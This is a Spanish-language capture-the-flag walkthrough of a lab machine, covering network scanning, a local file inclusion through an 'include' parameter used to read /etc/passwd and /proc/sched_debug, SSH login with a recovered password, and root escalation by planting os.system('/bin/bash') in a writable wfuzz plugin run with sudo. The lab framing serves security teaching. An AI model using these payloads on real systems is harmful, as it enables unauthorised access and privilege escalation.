Realizamos un escaneo inicial mediante ARP para identificar la dirección IP de la máquina objetivo. Como resultado, localizamos el host con la IP `192.168.0.23`.
```
sudo arp-scan -I eth0 --localnet 
```
![[Captura de pantalla de 2025-05-29 10-37-22.png]]

Realizamos una enumeración de puertos con `nmap` y descubrimos que los puertos 22 (SSH) y 80 (HTTP) se encuentran abiertos.
```
nmap -p- --open -sS -sC -sV 192.168.0.23 
```
![[Captura de pantalla de 2025-05-29 10-44-42.png]]
Al detectar que el puerto 80 (HTTP) está abierto, accedemos a la dirección IP desde el navegador para analizar el contenido que se muestra en la web.

![[Captura de pantalla de 2025-05-29 10-51-13.png]]
Observamos que hay un proceso en ejecución, por lo que continuamos con la enumeración. Utilizamos Gobuster para descubrir posibles directorios ocultos que puedan proporcionarnos más información.
```
gobuster dir -u http://192.168.0.23 -w /usr/share/wordlists/dirb/common.txt -t 40
```
![[Captura de pantalla de 2025-05-29 10-55-30.png]]

Procedemos a investigar más a fondo el archivo `index.php`. Para ello, lanzamos un escaneo con Nikto con el objetivo de detectar posibles vulnerabilidades o configuraciones inseguras.
```
sudo nikto -h http://192.168.0.23/index.php
```
![[Pasted image 20250529111054.png]]

![[Captura de pantalla de 2025-05-29 11-11-23.png]]

Nikto nos indica que el parámetro `include` podría ser vulnerable a una vulnerabilidad de inclusión local de archivos (LFI). Para comprobarlo, realizamos una petición con `curl` y observamos la información que devuelve la página.
```
curl http://192.168.0.23/index.php?include=../../../../../../../../../etc/passwd 
```

![[Pasted image 20250529125853.png]]
Aprovechando la vulnerabilidad LFI, intentamos acceder al archivo `/proc/sched_debug`, ya que anteriormente se mostró un pequeño fragmento de su contenido, lo cual indica que podría estar accesible. Este archivo proporciona información sobre las tareas (procesos) en ejecución. Para facilitar la lectura, filtramos la salida utilizando `grep` con las palabras clave `ben`, `pass`, `flag`, `task` y `cmd`, centrándonos así en los datos potencialmente relevantes.
```
curl "http://192.168.0.23/index.php?include=../../../../proc/sched_debug" | grep -i 'ben\|pass\|flag\|task\|cmd'
```
![[Captura de pantalla de 2025-05-29 17-56-45.png]]

Accedemos a la máquina mediante SSH con el usuario `ben` para continuar la enumeración y explotación:
```
sudo ssh ben@192.168.0.23
pass: B3nP4zz
```

Ejecutamos `ls -lat` para listar los archivos en el directorio home del usuario ben y encontramos el archivo `user.txt`, que contiene la flag del usuario:

![[Captura de pantalla de 2025-05-30 08-55-02.png]]
Listamos los permisos sudo del usuario ben para ver qué comandos puede ejecutar sin contraseña. Encontramos que puede ejecutar el binario `wfuzz` como sudo:
```
sudo -l
```
![[Captura de pantalla de 2025-05-30 09-00-17.png]]
Buscando archivos relacionados con `wfuzz` en los que el usuario tenga permisos de escritura, encontramos un archivo Python llamado `range.py`:
```bash
find / -writable 2>/dev/null | grep "wfuzz"
```

![[Captura de pantalla de 2025-05-30 09-26-18.png]]

Editamos el archivo vulnerable para insertar código que nos permita obtener una shell: ```ben@brain:~$ nano /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py ```Añadimos el siguiente código **al principio** del archivo para ejecutar una shell Bash:
```
import os
os.system("/bin/bash")
```


![[Captura de pantalla de 2025-05-30 09-29-51.png]]

En cuanto se ejecute, el código Python se disparará automáticamente y nos abrirá una **shell interactiva con privilegios de root**.

```bash
sudo /usr/bin/wfuzz -z range,0-10 --hl 97 http://localhost
```

![[Captura de pantalla de 2025-05-30 09-40-59.png]]
## Por qué funciona esto?

`wfuzz` está hecho en Python y al ejecutar el payload `range` importa y ejecuta `range.py`, por lo que al modificar ese archivo con código que lanza una shell (`os.system("/bin/bash")`) y ejecutar `wfuzz` con `sudo`, obtenemos una shell con privilegios de root.